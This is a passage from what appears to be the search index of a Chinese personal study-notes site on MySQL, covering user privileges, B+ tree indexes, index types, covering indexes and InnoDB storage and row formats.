<li> <p>tablename-\u8868\u540d,\u5982\u679c\u8981\u6388\u4e88\u8be5\u7528\u6237\u5bf9\u6240\u6709\u6570\u636e\u5e93\u548c\u8868\u7684\u76f8\u5e94\u64cd\u4f5c\u6743\u9650\u5219\u53ef\u7528 \u8868\u793a, \u5982.*</p> </li> </ul> <pre><code># \u4f8b\u5982\ngrant all on *.* to lee@localhost\n</code></pre> </li> <li> <p>\u7528\u6237\u64a4\u6743</p> <pre><code>drop privileges on databasename.tablename from user@host;\n</code></pre> </li> </ol>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_2","title":"\u7d22\u5f15","text":""},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_3","title":"\u7d22\u5f15\u7684\u6570\u636e\u7ed3\u6784","text":"<p>\u7d22\u5f15\u7684\u76ee\u7684\u53ea\u8981\u662f\u4e3a\u4e86\u5feb\u901f\u6570\u636e\u5e93\u67e5\u8be2\u64cd\u4f5c,\u51cf\u5c11\u7cfb\u7edfI/O,\u4f18\u79c0\u7684\u7d22\u5f15,\u4f46\u662f\u7d22\u5f15\u4e5f\u4f1a\u5e26\u6765\u4e00\u4e9b\u8d1f\u9762\u5f71\u54cd,\u90a3\u5c31\u662f\u964d\u4f4e\u589e\u5220\u6539\u7684\u6548\u7387,\u4f46\u662f\u603b\u4f53\u6765\u8bb2,\u8bbe\u7f6e\u7d22\u5f15\u8fd8\u662f\u5229\u5927\u4e8e\u5f0a,\u4f46\u662f\u5982\u4f55\u5408\u7406\u7684\u8bbe\u7f6e\u7d22\u5f15\u4e5f\u662f\u4e00\u95e8\u503c\u5f97\u7814\u7a76\u7684\u5b66\u95ee.</p> <p>\u7d22\u5f15\u672c\u8d28\u4e0a\u59cb\u7ec8\u6570\u636e\u7ed3\u6784,InnoDB\u4e2d\u5e38\u89c1\u7684\u7d22\u5f15\u6709B+\u6811,FULL-TEXT\u7d22\u5f15,\u4f46\u662f\u5e38\u89c1\u7684\u8fd8\u662fB+\u6811,\u518d\u6b21,\u6211\u4eec\u5c31\u4e00\u7814\u7a76MySQL\u4e2dInnoDB\u4e2d\u7684\u9ed8\u8ba4\u4f7f\u7528\u7684B+\u6811\u4e3a\u4f8b,\u6765\u7814\u7a76\u5982\u4f55\u5408\u7406\u7684\u8bbe\u7f6e\u7d22\u5f15.</p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#b","title":"B+\u6811\u7684\u7ed3\u6784","text":"<p>B+\u6811\u662f\u4e00\u79cd\u6811\u72b6\u7ed3\u6784,\u4ed6\u7684\u7279\u70b9\u662f:</p> <ul> <li>\u7d22\u5f15\u548c\u6570\u636e\u5206\u79bb,\u771f\u5b9e\u6570\u636e\u5b58\u653e\u5728\u53f6\u5b50\u7ed3\u70b9,\u5176\u4f59\u7684\u5206\u652f\u8282\u70b9\u53ea\u662f\u4f5c\u4e3a\u7d22\u5f15\u6765\u4f7f\u7528.</li> <li>\u7236\u8282\u70b9\u4e2d\u7684\u503c\u59cb\u7ec8\u53ef\u4ee5\u5728\u5b50\u8282\u70b9\u4e2d\u627e\u5230\u4e0e\u5b83\u7b49\u503c\u7684\u8282\u70b9.</li> <li>\u53f6\u5b50\u7ed3\u70b9\u4e0d\u662f\u5b8c\u5168\u5206\u6563\u72ec\u7acb\u7684,\u4ed6\u4f1a\u5206\u6210\u4e00\u4e2a\u4e00\u4e2a\u7684\u6bb5,\u6bcf\u4e00\u4e2a\u6bb5\u6709\u4e00\u4e2a\u9608\u503c(\u8fd9\u4e2a\u5c31\u662f\u8fd9\u9897B+\u6811\u7684\u6700\u5927\u5ea6),\u5728\u540c\u4e00\u6bb5\u7684\u8282\u70b9\u662f\u5b58\u50a8\u5728\u4e00\u6bb5\u8fde\u7eed\u7684\u5b58\u50a8\u7a7a\u95f4\u4e2d\u7684.</li> <li>\u5220\u9664\u8282\u70b9\u4f1a\u89e6\u53d1\u68c0\u67e5,\u4e5f\u5c31\u662f\u548c\u76f8\u90bb\u7684\u5144\u5f1f\u8282\u70b9\u4e4b\u95f4\u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u5408\u5e76,\u4e5f\u5c31\u662f\u4e24\u8005\u76f8\u52a0\u662f\u5426\u4f1a\u8d85\u8fc7\u8fd9\u68f5\u6811\u7684\u6700\u5927\u5ea6.</li> </ul> <p>B+\u6811\u5bf9\u4e8eB\u6811\u7684\u4e00\u79cd\u7279\u6b8a\u6f14\u8fdb\u7ed3\u6784,\u8fd9\u79cd\u7ed3\u6784\u76f8\u6bd4\u4e8eB\u6811\u800c\u8a00,\u53ef\u4ee5\u5b9e\u73b0\u7d22\u5f15\u548c\u771f\u662f\u6570\u636e\u5206\u79bb,\u540c\u65f6\u6240\u6709\u503c\u90fd\u5728\u53f6\u5b50\u7ed3\u70b9,\u65b9\u4fbf\u505a\u8303\u56f4\u67e5\u8be2.</p> <p>InnoDB\u4e2d\u8fd8\u8bb2\u6bcf\u4e00\u4e2a\u53f6\u5b50\u7ed3\u70b9\u7684\u6bcf\u4e00\u6bb5\u9996\u5c3e\u5c3e\u52a0\u4e0a\u4e86\u4e00\u4e2a\u6307\u9488,\u6307\u5411\u76f8\u90bb\u53f6\u5b50\u7ed3\u70b9\u6bb5,\u8fd9\u6837\u53f6\u5b50\u8282\u70b9\u5c31\u5f62\u6210\u4e86\u4e00\u4e2a\u5206\u6bb5\u7684\u53cc\u5411\u94fe\u8868.\u8fd9\u6837\u7684\u8303\u56f4\u67e5\u8be2\u66f4\u5feb.</p> <p>\u6bd4\u5982\u6211\u73b0\u5728\u8981\u67e5\u8be2\u6bd42\u5927\u7684\u8282\u70b9,\u6211\u53ea\u9700\u8981\u5148\u627e\u5230\u952e\u4e3a2\u7684\u8282\u70b9,\u7136\u540e\u5728\u94fe\u8868\u4e2d\u8fed\u4ee3\u904d\u5386\u5373\u53ef.</p> <p>\u8fd9\u91cc\u4f1a\u6709\u4e2a\u95ee\u9898,\u5982\u679c\u4e00\u5f00\u59cb\u6ca1\u67092\u7684\u8282\u70b9,\u90a3\u600e\u4e48\u529e?</p> <p>InnoDB\u4f1a\u8fdb\u884c\u4e00\u4e2a\u76f8\u4f3c\u67e5\u8be2,\u5c31\u662f\u627e\u5230\u4e00\u4e2a\u6700\u8fd1\u7684,\u8fd9\u6837\u7684\u6548\u7387\u4f1a\u6709\u6240\u635f\u8017,\u56e0\u6b64\u5728MySQL\u4f18\u5316\u65f6,\u4e00\u822c\u5efa\u8bae\u5728\u8303\u56f4\u67e5\u8be2\u662f\u4f7f\u7528\u7b49\u503c\u8fdb\u884c\u5339\u914d(\u6bd4\u5982\u5728\u6574\u6570\u4e2d\u67e5\u627e\u5927\u4e8e1\u7684\u6570,\u53ef\u4ee5\u5199\u5927\u4e8e\u7b49\u4e8e2)</p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#b_1","title":"B+\u6811\u7684\u4f18\u7f3a\u70b9","text":"<ol> <li> <p>\u4f18\u70b9:</p> </li> <li> <p>\u5355\u8bcd\u8bf7\u6c42\u6d89\u53ca\u5230\u78c1\u76d8I/O\u6b21\u6570\u5c11:</p> <p>\u6811\u7684\u9ad8\u5ea6\u5c0f,\u5728\u7cbe\u51c6\u67e5\u627e\u65f6,\u6811\u7684\u9ad8\u5ea6\u5f80\u5f80\u51b3\u5b9a\u4e86I/O\u7684\u6b21\u6570.</p> </li> <li> <p>\u67e5\u8be2\u6548\u7387\u9ad8:</p> <p>\u67e5\u8be2\u6548\u7387\u7531\u6811\u7684\u9ad8\u548c\u8282\u70b9\u7684\u5ea6\u6570\u51b3\u5b9a,\u4f46\u662f\u76f8\u6bd4\u8f83,\u4f46\u5176\u5b9e\u4f46\u5c31\u6570\u636e\u7ed3\u6784\u6765\u8bb2,\u4ed6\u548c\u7ea2\u9ed1\u6811\u662f\u5dee\u4e0d\u591a\u7684,\u53ea\u662f\u8bf4\u5bf9\u4e8eB+\u6811,\u5728\u5b9e\u9645\u4f7f\u7528\u4e2d,I/O\u51cf\u5c11\u4e86\u65f6\u95f4\u7684\u5f00\u9500.</p> </li> <li> <p>\u904d\u5386\u6548\u7387\u9ad8:</p> <p>B+\u6811\u7684\u6240\u6709\u53f6\u5b50\u8282\u70b9\u4f1a\u8fde\u63a5\u6210\u4e3a\u4e00\u4e2a\u53cc\u5411\u94fe\u8868,\u56e0\u6b64\u5728\u904d\u5386\u7684\u65f6\u5019\u53ea\u9700\u8981\u5728\u94fe\u8868\u4e0a\u64cd\u4f5c\u5373\u53ef,\u6548\u7387\u66f4\u9ad8.</p> </li> <li> <p>\u7f3a\u70b9:</p> </li> <li> <p>\u5bf9\u4e8e\u65e0\u5e8f\u63d2\u5165,\u5bfc\u81f4\u7684I/O\u4f1a\u6bd4\u8f83\u5927(\u8fd9\u4e00\u662f\u6211\u4eec\u5728\u6570\u636e\u5e93\u4e3b\u952e\u8bbe\u8ba1\u65f6\u63a8\u8350\u4f7f\u7528\u81ea\u52a8\u9012\u589e\u7684\u539f\u56e0)</p> </li> <li> <p>\u5220\u9664\u65f6\u53ef\u80fd\u89e6\u53d1\u7684\u5b50\u8282\u70b9\u5408\u5e76,\u5bf9\u4e8eI/O\u6d41\u7684\u9700\u6c42\u53ef\u80fd\u4f1a\u6bd4\u8f83\u5927.</p> </li> <li> <p>\u603b\u7ed3</p> </li> </ol> <p>\u603b\u4f53\u6765\u8bb2,B+\u6811\u53ef\u4ee5\u4f7f\u7528\u5927\u90e8\u5206\u7684\u573a\u666f,\u8fd9\u4e5f\u5c31\u662fInnoDB\u5c06\u5176\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u7684\u7d22\u5f15\u7ed3\u6784\u7684\u539f\u56e0,\u4f46\u662fB+\u6811\u6700\u660e\u663e\u7684\u4f18\u52bf\u8fd8\u662f\u5728\u8bfb\u7684\u573a\u666f\u4e0b,\u56e0\u6b64\u5bf9\u4e8e\u6570\u636e\u91cd\u8981,\u591a\u8bfb\u5c11\u5199\u7684\u573a\u666f,\u5f3a\u70c8\u63a8\u8350\u4f7f\u7528B+\u6811.</p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_4","title":"\u7d22\u5f15\u7684\u5206\u7c7b","text":"<ul> <li>\u6309\u300c\u6570\u636e\u7ed3\u6784\u300d\u5206\u7c7b\uff1aB+tree\u7d22\u5f15\u3001Hash\u7d22\u5f15\u3001Full-text\u7d22\u5f15\u3002</li> <li>\u6309\u300c\u7269\u7406\u5b58\u50a8\u300d\u5206\u7c7b\uff1a\u805a\u7c07\u7d22\u5f15\uff08\u4e3b\u952e\u7d22\u5f15\uff09\u3001\u4e8c\u7ea7\u7d22\u5f15\uff08\u8f85\u52a9\u7d22\u5f15\uff09\u3002</li> <li>\u6309\u300c\u5b57\u6bb5\u7279\u6027\u300d\u5206\u7c7b\uff1a\u4e3b\u952e\u7d22\u5f15\u3001\u552f\u4e00\u7d22\u5f15\u3001\u666e\u901a\u7d22\u5f15\u3001\u524d\u7f00\u7d22\u5f15\u3002</li> <li>\u6309\u300c\u5b57\u6bb5\u4e2a\u6570\u300d\u5206\u7c7b\uff1a\u5355\u5217\u7d22\u5f15\u3001\u8054\u5408\u7d22\u5f15\u3002</li> </ul>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_5","title":"\u7d22\u5f15\u7684\u7279\u6027","text":""},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_6","title":"\u6309\u6570\u636e\u7ed3\u6784\u5206\u7c7b","text":""},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_7","title":"\u6309\u7269\u7406\u5b58\u50a8\u5206\u7c7b","text":"<p>\u4ece\u7269\u7406\u5b58\u50a8\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u7d22\u5f15\u5206\u4e3a\u805a\u7c07\u7d22\u5f15\uff08\u4e3b\u952e\u7d22\u5f15\uff09\u3001\u4e8c\u7ea7\u7d22\u5f15\uff08\u8f85\u52a9\u7d22\u5f15\uff09\u3002</p> <p>\u8fd9\u4e24\u4e2a\u533a\u522b\u5728\u524d\u9762\u4e5f\u63d0\u5230\u4e86\uff1a</p> <ul> <li>\u4e3b\u952e\u7d22\u5f15\u7684 B+Tree \u7684\u53f6\u5b50\u8282\u70b9\u5b58\u653e\u7684\u662f\u5b9e\u9645\u6570\u636e\uff0c\u6240\u6709\u5b8c\u6574\u7684\u7528\u6237\u8bb0\u5f55\u90fd\u5b58\u653e\u5728\u4e3b\u952e\u7d22\u5f15\u7684 B+Tree \u7684\u53f6\u5b50\u8282\u70b9\u91cc\uff1b</li> <li>\u4e8c\u7ea7\u7d22\u5f15\u7684 B+Tree \u7684\u53f6\u5b50\u8282\u70b9\u5b58\u653e\u7684\u662f\u4e3b\u952e\u503c\uff0c\u800c\u4e0d\u662f\u5b9e\u9645\u6570\u636e\u3002</li> </ul> <p>\u6240\u4ee5\uff0c\u5728\u67e5\u8be2\u65f6\u4f7f\u7528\u4e86\u4e8c\u7ea7\u7d22\u5f15\uff0c\u5982\u679c\u67e5\u8be2\u7684\u6570\u636e\u80fd\u5728\u4e8c\u7ea7\u7d22\u5f15\u91cc\u67e5\u8be2\u7684\u5230\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u56de\u8868\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u662f\u8986\u76d6\u7d22\u5f15\u3002\u5982\u679c\u67e5\u8be2\u7684\u6570\u636e\u4e0d\u5728\u4e8c\u7ea7\u7d22\u5f15\u91cc\uff0c\u5c31\u4f1a\u5148\u68c0\u7d22\u4e8c\u7ea7\u7d22\u5f15\uff0c\u627e\u5230\u5bf9\u5e94\u7684\u53f6\u5b50\u8282\u70b9\uff0c\u83b7\u53d6\u5230\u4e3b\u952e\u503c\u540e\uff0c\u7136\u540e\u518d\u68c0\u7d22\u4e3b\u952e\u7d22\u5f15\uff0c\u5c31\u80fd\u67e5\u8be2\u5230\u6570\u636e\u4e86\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u662f\u56de\u8868\u3002</p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_8","title":"\u6309\u5b57\u6bb5\u7279\u6027\u5206\u7c7b","text":"<p>\u4ece\u5b57\u6bb5\u7279\u6027\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u7d22\u5f15\u5206\u4e3a\u4e3b\u952e\u7d22\u5f15\u3001\u552f\u4e00\u7d22\u5f15\u3001\u666e\u901a\u7d22\u5f15\u3001\u524d\u7f00\u7d22\u5f15\u3002</p> <ol> <li> <p>\u4e3b\u952e\u7d22\u5f15</p> </li> <li> <p>\u4e00\u5f20\u8868\u6700\u591a\u53ea\u6709\u4e00\u4e2a\u4e3b\u952e\u7d22\u5f15</p> </li> <li>\u4e3b\u952e\u7d22\u5f15\u53ea\u80fd\u662f\u5355\u5217\u7d22\u5f15</li> <li>\u4e3b\u952e\u7d22\u5f15\u4e0d\u80fd\u4e3aNULL\u4e14\u4e0d\u80fd\u91cd\u590d</li> <li>\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u5efa\u8bae\u6bcf\u4e2a\u8868\u90fd\u8981\u6709\u4e3b\u952e\u7d22\u5f15</li> <li> <p>\u4e3b\u952e\u7d22\u5f15\u5efa\u8bae\u4f7f\u7528\u9012\u589e\u7684\u65b9\u5f0f\u751f\u6210\uff0c\u53ef\u4ee5\u518d\u65b0\u589e\u6570\u636e\u662f\u539f\u5148\u6570\u636e\u7684\u79fb\u52a8</p> </li> <li> <p>\u552f\u4e00\u7d22\u5f15</p> </li> <li> <p>\u4e00\u5f20\u8868\u53ef\u4ee5\u6709\u591a\u4e2a\u552f\u4e00\u7d22\u5f15</p> </li> <li>\u5f53\u552f\u4e00\u7d22\u5f15\u662f\u8054\u5408\u7d22\u5f15\u65f6\uff0c\u552f\u4e00\u6027\u53ea\u6709\u5728\u8054\u5408\u5b57\u6bb5\u4efb\u610f\u552f\u4e00\u5373\u53ef</li> <li> <p>\u552f\u4e00\u7d22\u5f15\u53ef\u4ee5\u4e3aNULL\uff0c\u552f\u4e00\u6027\u5bf9NULL\u4e0d\u8d77\u4f5c\u7528\uff0c\u5373\u53ef\u4ee5\u5b58\u5728\u591a\u4e2aNULL</p> </li> <li> <p>\u666e\u901a\u7d22\u5f15</p> </li> <li> <p>\u666e\u901a\u7d22\u5f15\u6ca1\u6709\u4e25\u683c\u7684\u7ea6\u675f\u6761\u4ef6\uff0c\u4e3b\u8981\u7528\u6765\u52a0\u5feb\u68c0\u7d22\u901f\u5ea6\uff0c\u4f46\u662f\u7d22\u5f15\u7684\u5efa\u7acb\u4f1a\u5f71\u54cd\u589e\u5220\u6539\u7684\u6027\u80fd</p> </li> <li> <p>\u666e\u901a\u7d22\u5f15\u7684\u5efa\u7acb\u8981\u6839\u636e\u5b9e\u9645\u7684\u4e1a\u52a1\u60c5\u51b5\uff0c\u5f53\u4e00\u4e2a\u5b57\u6bb5\u91cd\u590d\u7684\u6982\u7387\u5f88\u5927\u65f6\uff08\u6bd4\u5982\u6027\u522b\u8fd9\u4e00\u5b57\u6bb5\uff09\uff0c\u5219\u65e0\u9700\u5efa\u7acb\u7d22\u5f15</p> </li> <li> <p>\u524d\u7f00\u7d22\u5f15</p> </li> <li> <p>\u524d\u7f00\u7d22\u5f15\u662f\u6307\u5bf9\u5b57\u7b26\u7c7b\u578b\u5b57\u6bb5\u7684\u524d\u51e0\u4e2a\u5b57\u7b26\u5efa\u7acb\u7684\u7d22\u5f15\uff0c\u800c\u4e0d\u662f\u5728\u6574\u4e2a\u5b57\u6bb5\u4e0a\u5efa\u7acb\u7684\u7d22\u5f15</p> </li> <li> <p>\u53ef\u4ee5\u5efa\u7acb\u5728\u5b57\u6bb5\u7c7b\u578b\u4e3a char\u3001 varchar\u3001binary\u3001varbinary \u7684\u5217\u4e0a</p> </li> <li> <p>\u4f7f\u7528\u524d\u7f00\u7d22\u5f15\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u51cf\u5c11\u7d22\u5f15\u5360\u7528\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u63d0\u5347\u67e5\u8be2\u6548\u7387</p> </li> <li> <p>\u524d\u7f00\u7d22\u5f15\u6ee1\u8db3\u6700\u5de6\u524d\u7f00\u539f\u5219\uff0c\u9047\u5230<code>like \u2018%string\u2019</code>\u65f6\u5931\u6548\uff0c\u5373\u901a\u914d\u7b26\u5728\u6307\u5b9a\u5b57\u7b26\u4e32\u524d\u65f6\u5931\u6548</p> <p>\u5f53\u67e5\u8be2\u8bed\u53e5\u901a\u8fc7\u4e8c\u7ea7\u7d22\u5f15\u907f\u514d\u4e86\u56de\u8868\u67e5\u8be2\u65f6\uff0c\u6211\u4eec\u8ba4\u4e3a\u7d22\u5f15\u6ca1\u6709\u5931\u6548\uff0c\u4f46\u662f\u5176\u5b9e\u672c\u8d28\u4e0a\u4f9d\u7136\u5bf9\u4e8c\u7ea7\u7d22\u5f15\u7684B+\u6811\u904d\u5386\u4e86</p> </li> <li> <p>order by \u5c31\u65e0\u6cd5\u4f7f\u7528\u524d\u7f00\u7d22\u5f15\uff1b</p> </li> <li> <p>\u65e0\u6cd5\u628a\u524d\u7f00\u7d22\u5f15\u7528\u4f5c\u8986\u76d6\u7d22\u5f15\uff1b</p> </li> </ol>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_9","title":"\u6309\u5b57\u6bb5\u4e2a\u6570\u5206\u7c7b","text":"<ul> <li> <p>\u5efa\u7acb\u5728\u5355\u5217\u4e0a\u7684\u7d22\u5f15\u79f0\u4e3a\u5355\u5217\u7d22\u5f15\uff0c\u6bd4\u5982\u4e3b\u952e\u7d22\u5f15\uff1b</p> </li> <li> <p>\u5efa\u7acb\u5728\u591a\u5217\u4e0a\u7684\u7d22\u5f15\u79f0\u4e3a\u8054\u5408\u7d22\u5f15\uff1b</p> </li> </ul> <p>\u8054\u5408\u7d22\u5f15\u9075\u5faa\u6700\u5de6\u524d\u7f00\u539f\u5219\uff0c\u56e0\u6b64\u5728\u5efa\u7acb\u8054\u5408\u7d22\u5f15\u65f6\u7684\u5b57\u6bb5\u7684\u5148\u540e\u987a\u5e8f\u4f1a\u5f71\u54cd\u7d22\u5f15\u7684\u7ed3\u6784</p> <p>\u5efa\u7acb\u5408\u9002\u7684\u8054\u5408\u7d22\u5f15\uff0c\u53ef\u4ee5\u5b9e\u73b0\u8986\u76d6\u7d22\u5f15\u4f18\u5316\uff0c\u51cf\u5c11\u56de\u8868\u67e5\u8be2</p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_10","title":"\u5728\u78c1\u76d8\u4e2d\u7684\u5b58\u50a8\u7ed3\u6784","text":"<p>MySQL\u5e38\u7528\u7684InnoDB\u5c06\u6570\u636e\u5b58\u50a8\u5728\u78c1\u76d8\u4e2d\uff0c\u4e3a\u4e86\u8fbe\u5230\u66f4\u52a0\u9ad8\u6548\u7684\u6570\u636e\u8bfb\u5199\uff0cInnoDB\u4f7f\u7528\u4e86\u7279\u6b8a\u7684\u5b58\u50a8\u7ed3\u6784\u5c06\u6570\u636e\u6301\u4e45\u5316\u5728\u78c1\u76d8\u4e0a</p> <p>InnoDB\u5c06\u6570\u636e\u8868\u4ee5\u6587\u4ef6\u7684\u5f62\u5f0f\u6301\u4e45\u5316\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>SHOW VARIABLES LIKE 'datadir'</code>\u6765\u67e5\u770b\u4ed6\u6240\u5b58\u50a8\u7684\u4f4d\u7f6e\u3002</p> <p>\u5728\u6700\u65b0\u7248\u7684MySQL\u4e2d\uff0c\u6570\u636e\u6587\u4ef6\u90fd\u5b58\u653e\u5728idb\u6587\u4ef6\u4e2d\u3002\u6211\u4eec\u628a\u8fd9\u4e2a\u6587\u4ef6\u53eb\u505a\u8868\u7a7a\u95f4</p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_11","title":"\u8868\u7a7a\u95f4\u6587\u4ef6\u7684\u7ed3\u6784","text":"<p>\u8868\u7a7a\u95f4\u7531\u6bb5\uff08segment\uff09\u3001\u533a\uff08extent\uff09\u3001\u9875\uff08page\uff09\u3001\u884c\uff08row\uff09\u7ec4\u6210\uff0cInnoDB\u5b58\u50a8\u5f15\u64ce\u7684\u903b\u8f91\u5b58\u50a8\u7ed3\u6784\u5927\u81f4\u5982\u4e0b\u56fe\uff1a</p> <p></p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_12","title":"\u884c","text":"<p>\u8fd9\u91cc\u7684\u884c\u5c31\u5bf9\u5e94\u7740\u6570\u636e\u5e93\u4e2d\u7684\u884c\u8bb0\u5f55\uff0c\u56e0\u6b64\u884c\u7684\u5927\u5c0f\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u4f46\u662f\u884c\u4e5f\u662f\u6709\u7279\u5b9a\u683c\u5f0f\u3002</p> <p>InnoDB \u63d0\u4f9b\u4e86 4 \u79cd\u884c\u683c\u5f0f\uff0c\u5206\u522b\u662f Redundant\u3001Compact\u3001Dynamic\u548c Compressed \u884c\u683c\u5f0f\u3002</p> <ul> <li>Redundant \u662f\u5f88\u53e4\u8001\u7684\u884c\u683c\u5f0f\u4e86\uff0c MySQL 5.0 \u7248\u672c\u4e4b\u524d\u7528\u7684\u884c\u683c\u5f0f\uff0c\u73b0\u5728\u57fa\u672c\u6ca1\u4eba\u7528\u4e86\u3002</li> <li>\u7531\u4e8e Redundant \u4e0d\u662f\u4e00\u79cd\u7d27\u51d1\u7684\u884c\u683c\u5f0f\uff0c\u6240\u4ee5 MySQL 5.0 \u4e4b\u540e\u5f15\u5165\u4e86 Compact \u884c\u8bb0\u5f55\u5b58\u50a8\u65b9\u5f0f\uff0cCompact \u662f\u4e00\u79cd\u7d27\u51d1\u7684\u884c\u683c\u5f0f\uff0c\u8bbe\u8ba1\u7684\u521d\u8877\u5c31\u662f\u4e3a\u4e86\u8ba9\u4e00\u4e2a\u6570\u636e\u9875\u4e2d\u53ef\u4ee5\u5b58\u653e\u66f4\u591a\u7684\u884c\u8bb0\u5f55\uff0c\u4ece MySQL 5.1 \u7248\u672c\u4e4b\u540e\uff0c\u884c\u683c\u5f0f\u9ed8\u8ba4\u8bbe\u7f6e\u6210 Compact\u3002</li> <li> <p>Dynamic \u548c Compressed \u4e24\u4e2a\u90fd\u662f\u7d27\u51d1\u7684\u884c\u683c\u5f0f\uff0c\u5b83\u4eec\u7684\u884c\u683c\u5f0f\u90fd\u548c Compact \u5dee\u4e0d\u591a\uff0c\u56e0\u4e3a\u90fd\u662f\u57fa\u4e8e Compact \u6539\u8fdb\u4e00\u70b9\u4e1c\u897f\u3002\u4ece MySQL5.7 \u7248\u672c\u4e4b\u540e\uff0c\u9ed8\u8ba4\u4f7f\u7528 Dynamic \u884c\u683c\u5f0f\u3002</p> </li> <li> <p>Compact\u884c\u683c\u5f0f</p> </li> </ul> <p></p> <ul> <li> <p>\u8bb0\u5f55\u7684\u989d\u5916\u4fe1\u606f</p> </li> <li> <p>\u53d8\u957f\u5b57\u6bb5\u957f\u5ea6\u5217\u8868</p> <p>\u5728\u5b58\u50a8\u6570\u636e\u65f6\uff0c\u5bf9\u4e8e\u90e8\u5206\u957f\u5ea6\u53ef\u53d8\u7684\u5b57\u6bb5\uff0c\u4e0d\u7ecf\u9700\u8981\u5c06\u6570\u636e\u672c\u8eab\u5b58\u50a8\u8d77\u6765\uff0c\u8fd8\u9700\u8981\u5c06\u6570\u636e\u7684\u957f\u5ea6\u5b58\u50a8\u8d77\u6765\uff08\u53ef\u53c2\u8003Java\u4e2d\u7684String\u7c7b\u578b\uff09\uff0c\u56e0\u6b64\u636e\u9700\u8981\u4f7f\u7528\u53d8\u957f\u5b57\u6bb5\u957f\u5ea6\u5217\u8868</p> <ul> <li> <p>\u53d8\u957f\u5b57\u6bb5\u957f\u5ea6\u5217\u8868\u672c\u8eab\u7684\u957f\u5ea6\u7531\u5e38\u89c1\u8868\u65f6\u89c4\u5b9a\u7684\u53ef\u53d8\u5b57\u6bb5\u7684\u6570\u91cf\u548c\u6bcf\u4e2a\u5b57\u6bb5\u7684\u957f\u5ea6\u9608\u503c\u51b3\u5b9a</p> </li> <li> <p>\u9006\u5e8f\u5b58\u653e\u7684\u7279\u70b9\uff1a</p> </li> </ul> <p>\u56e0\u4e3a\u300c\u8bb0\u5f55\u5934\u4fe1\u606f\u300d\u4e2d\u6307\u5411\u4e0b\u4e00\u4e2a\u8bb0\u5f55\u7684\u6307\u9488\uff0c\u6307\u5411\u7684\u662f\u4e0b\u4e00\u6761\u8bb0\u5f55\u7684\u300c\u8bb0\u5f55\u5934\u4fe1\u606f\u300d\u548c\u300c\u771f\u5b9e\u6570\u636e\u300d\u4e4b\u95f4\u7684\u4f4d\u7f6e\uff0c\u8fd9\u6837\u7684\u597d\u5904\u662f\u5411\u5de6\u8bfb\u5c31\u662f\u8bb0\u5f55\u5934\u4fe1\u606f\uff0c\u5411\u53f3\u8bfb\u5c31\u662f\u771f\u5b9e\u6570\u636e\uff0c\u6bd4\u8f83\u65b9\u4fbf\u3002</p> <p>\u300c\u53d8\u957f\u5b57\u6bb5\u957f\u5ea6\u5217\u8868\u300d\u4e2d\u7684\u4fe1\u606f\u4e4b\u6240\u4ee5\u8981\u9006\u5e8f\u5b58\u653e\uff0c\u662f\u56e0\u4e3a\u8fd9\u6837\u53ef\u4ee5\u4f7f\u5f97\u4f4d\u7f6e\u9760\u524d\u7684\u8bb0\u5f55\u7684\u771f\u5b9e\u6570\u636e\u548c\u6570\u636e\u5bf9\u5e94\u7684\u5b57\u6bb5\u957f\u5ea6\u4fe1\u606f\u53ef\u4ee5\u540c\u65f6\u5728\u4e00\u4e2a CPU Cache Line \u4e2d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u63d0\u9ad8 CPU Cache \u7684\u547d\u4e2d\u7387\u3002</p> <p>\u540c\u6837\u7684\u9053\u7406\uff0c NULL \u503c\u5217\u8868\u7684\u4fe1\u606f\u4e5f\u9700\u8981\u9006\u5e8f\u5b58\u653e\u3002</p> </li> <li> <p>NULL\u503c\u5217\u8868</p> </li> </ul> <p>\u8868\u4e2d\u7684\u67d0\u4e9b\u5217\u53ef\u80fd\u4f1a\u5b58\u50a8 NULL \u503c\uff0c\u5982\u679c\u628a\u8fd9\u4e9b NULL \u503c\u90fd\u653e\u5230\u8bb0\u5f55\u7684\u771f\u5b9e\u6570\u636e\u4e2d\u4f1a\u6bd4\u8f83\u6d6a\u8d39\u7a7a\u95f4\uff0c\u6240\u4ee5 Compact \u884c\u683c\u5f0f\u628a\u8fd9\u4e9b\u503c\u4e3a NULL \u7684\u5217\u5b58\u50a8\u5230 NULL\u503c\u5217\u8868\u4e2d\u3002</p> <p>\u5982\u679c\u5b58\u5728\u5141\u8bb8 NULL \u503c\u7684\u5217\uff0c\u5219\u6bcf\u4e2a\u5217\u5bf9\u5e94\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff08bit\uff09\uff0c\u4e8c\u8fdb\u5236\u4f4d\u6309\u7167\u5217\u7684\u987a\u5e8f\u9006\u5e8f\u6392\u5217\u3002</p> <ul> <li>\u4e8c\u8fdb\u5236\u4f4d\u7684\u503c\u4e3a<code>1</code>\u65f6\uff0c\u4ee3\u8868\u8be5\u5217\u7684\u503c\u4e3aNULL\u3002</li> <li>\u4e8c\u8fdb\u5236\u4f4d\u7684\u503c\u4e3a<code>0</code>\u65f6\uff0c\u4ee3\u8868\u8be5\u5217\u7684\u503c\u4e0d\u4e3aNULL\u3002</li> <li> <p>\u53e6\u5916\uff0cNULL 